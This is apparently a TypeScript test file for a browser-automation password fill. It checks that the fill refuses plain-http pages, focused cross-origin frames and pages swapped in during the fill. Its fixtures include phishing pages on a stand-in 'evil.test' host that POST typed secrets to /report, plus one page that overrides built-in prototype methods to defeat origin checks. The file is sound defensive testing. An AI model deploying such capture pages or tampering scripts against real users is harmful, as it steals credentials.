// AU-38: a credential fill checked the page's origin, then typed in a separate
// CDP call into whatever held focus. A plain-http page passed the check, a
// focused cross-origin frame received the secret, and a navigation between the
// check and the typing could too. Both fill paths (the gateway's own, and the
// helper that runs inside a remote world) are driven against a real Chromium
// whose host names all resolve to local servers.
import { spawn, spawnSync } from 'node:child_process';
import fs from 'node:fs';
import http from 'node:http';
import https from 'node:https';
import os from 'node:os';
import path from 'node:path';
import type { AddressInfo } from 'node:net';
import type { Browser, Page } from 'playwright';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { fillViaCdp } from '../src/autonomy/fill.js';
import { findFreePortFrom } from '../src/util/ports.js';
import { launchChromium } from './helpers/browser.js';

const SECRET = 'correct horse battery staple';
const helper = path.resolve('src/autonomy/cdp-fill.mjs');
const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'karmax-fill-origin-'));
const captured: string[] = [];
let browser: Browser, devtools: string, securePort: number, plainPort: number;
const servers: Array<http.Server> = [];

// Every page a test opens: the login page, a login page that navigates away as
// soon as its password field gains focus, one whose frame from another site
// focuses itself, and that other site's pages, which report anything typed.
const pages: Record<string, string> = {
  'login.example.test/login': `<input id="user"><input id="pw" type="password"><div id="note">text</div>
    <script>for (const id of ['user', 'pw']) document.getElementById(id).addEventListener('input', () => { window.inputs = (window.inputs || 0) + 1; });</script>`,
  'login.example.test/navigates': `<input id="pw" type="password">
    <script>document.getElementById('pw').addEventListener('focus', () => { location.href = 'https://evil.test:PORT/capture'; });</script>`,
  'login.example.test/framed': `<input id="pw" type="password"><iframe src="https://evil.test:PORT/frame"></iframe>`,
  'evil.test/frame': `<input id="steal" autofocus>
    <script>const steal = document.getElementById('steal');
      window.focus(); steal.focus();
      steal.addEventListener('input', () => fetch('/report', { method: 'POST', body: steal.value }));
      addEventListener('load', () => { window.focus(); steal.focus(); });</script>`,
  // A phishing page that redefines what a check in its own realm would compare with.
  'evil.test/tamper': `<input id="steal" autofocus>
    <script>Array.prototype.some = () => true; String.prototype.endsWith = () => true; Array.prototype.includes = () => true;
      const steal = document.getElementById('steal'); steal.focus();
      steal.addEventListener('input', () => fetch('/report', { method: 'POST', body: steal.value }));</script>`,
  'evil.test/capture': `<input id="steal" autofocus>
    <script>const steal = document.getElementById('steal'); steal.focus();
      steal.addEventListener('input', () => fetch('/report', { method: 'POST', body: steal.value }));</script>`,
};

function serve(req: http.IncomingMessage, res: http.ServerResponse, port: number) {
  const host = String(req.headers.host ?? '').replace(/:\d+$/, '');
  const url = new URL(req.url ?? '/', 'https://local');
  if (req.method === 'POST' && url.pathname === '/report') {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => { captured.push(body); res.end('ok'); });
    return;
  }
  const page = pages[`${host}${url.pathname}`];
  res.writeHead(page ? 200 : 404, { 'content-type': 'text/html' });
  res.end(page ? `<!doctype html><title>${host}</title>${page.replaceAll('PORT', String(port))}` : 'not found');
}

beforeAll(async () => {
  spawnSync('openssl', ['req', '-x509', '-newkey', 'rsa:2048', '-nodes', '-days', '1', '-subj', '/CN=example.test',
    '-keyout', path.join(dir, 'tls.key'), '-out', path.join(dir, 'tls.crt')], { stdio: 'ignore' });
  const tls = { key: fs.readFileSync(path.join(dir, 'tls.key')), cert: fs.readFileSync(path.join(dir, 'tls.crt')) };
  const secure = https.createServer(tls, (req, res) => serve(req, res, securePort));
  const plain = http.createServer((req, res) => serve(req, res, plainPort));
  for (const server of [secure, plain]) {
    await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
    servers.push(server);
  }
  securePort = (secure.address() as AddressInfo).port;
  plainPort = (plain.address() as AddressInfo).port;
  const port = await findFreePortFrom(49400);
  devtools = `http://127.0.0.1:${port}`;
  browser = await launchChromium({ args: [`--remote-debugging-port=${port}`, '--host-resolver-rules=MAP *.test 127.0.0.1',
    '--ignore-certificate-errors'] });
}, 60_000);

afterAll(async () => {
  await browser?.close();
  for (const server of servers) server.close();
  fs.rmSync(dir, { recursive: true, force: true });
});

async function open(url: string): Promise<Page> {
  captured.length = 0;
  const context = browser.contexts()[0] ?? await browser.newContext();
  for (const page of context.pages()) await page.close();
  const page = await context.newPage();
  await page.goto(url);
  return page;
}

type Outcome = { origin?: string; error?: string };
/** The two fill paths, each resolving to what the fill reported. */
const paths: Record<'gateway' | 'world', (selector: string) => Promise<Outcome>> = {
  gateway: async (selector: string) => {
    try { return await fillViaCdp({ cdpUrl: devtools, selector, text: SECRET, expectDomains: ['example.test'] }); }
    catch (error) { return { error: (error as Error).message }; }
  },
  world: async (selector: string) => {
    const child = spawn(process.execPath, [helper, selector, 'example.test', devtools]);
    let out = '';
    child.stdout.on('data', (chunk) => { out += chunk; });
    child.stdin.end(SECRET);
    await new Promise((resolve) => child.on('close', resolve));
    return JSON.parse(out) as Outcome;
  },
};

it('runs the same in-page step on both paths', () => {
  const literal = (file: string) => fs.readFileSync(file, 'utf8').match(/const WRITE_IN_PAGE = `[\s\S]*?`;/)?.[0];
  expect(literal('src/autonomy/cdp-fill.mjs')).toBeDefined();
  expect(literal('src/autonomy/cdp-fill.mjs')).toBe(literal('src/autonomy/fill.ts'));
});

// The gateway resolves the secret between its check and its write, so a page
// can be replaced exactly there. The write must not run in the new page, whose
// realm redefines the builtins a check would compare with.
it('never writes into a page that replaced the checked one', async () => {
  const page = await open(`https://login.example.test:${securePort}/login`);
  await page.focus('#pw');
  await expect(fillViaCdp({ cdpUrl: devtools, selector: '@focused', expectDomains: ['example.test'],
    resolveText: async () => { await page.goto(`https://evil.test:${securePort}/tamper`); return SECRET; } })).rejects.toThrow();
  await page.waitForTimeout(300);
  expect(captured).toEqual([]);
  expect(await page.inputValue('#steal')).toBe('');
});

describe.each(Object.keys(paths) as Array<keyof typeof paths>)('the %s fill path', (name) => {
  const fill = paths[name];

  it('writes into the saved site\'s field, as input the page sees', async () => {
    const page = await open(`https://login.example.test:${securePort}/login`);
    expect(await fill('#pw')).toEqual({ origin: `https://login.example.test:${securePort}` });
    expect(await page.inputValue('#pw')).toBe(SECRET);
    expect(await page.evaluate('window.inputs')).toBe(1);
  });

  it('moves to the next field on @tab and writes there', async () => {
    const page = await open(`https://login.example.test:${securePort}/login`);
    await page.focus('#user');
    expect(await fill('@tab')).toMatchObject({ origin: `https://login.example.test:${securePort}` });
    expect(await page.inputValue('#pw')).toBe(SECRET);
    expect(await page.inputValue('#user')).toBe('');
  });

  it('refuses a page served over plain http', async () => {
    const page = await open(`http://login.example.test:${plainPort}/login`);
    expect((await fill('#pw')).error).toMatch(/not a secure page/);
    expect(await page.inputValue('#pw')).toBe('');
  });

  it('refuses when focus is in another site\'s frame', async () => {
    const page = await open(`https://login.example.test:${securePort}/framed`);
    await page.frameLocator('iframe').locator('#steal').focus();
    expect((await fill('@focused')).error).toMatch(/another frame/);
    expect((await fill('iframe')).error).toMatch(/another frame/);
    await page.waitForTimeout(300);
    expect(captured).toEqual([]);
  });

  it('refuses an element that is not a text field', async () => {
    await open(`https://login.example.test:${securePort}/login`);
    expect((await fill('#note')).error).toMatch(/not a text field/);
  });

  it('never delivers the secret to the page a focus handler navigates to', async () => {
    const page = await open(`https://login.example.test:${securePort}/navigates`);
    await fill('#pw');
    await page.waitForURL(/evil\.test/);
    await page.waitForTimeout(500);
    expect(captured.filter((value) => value.includes(SECRET.slice(0, 7)))).toEqual([]);
  });
});
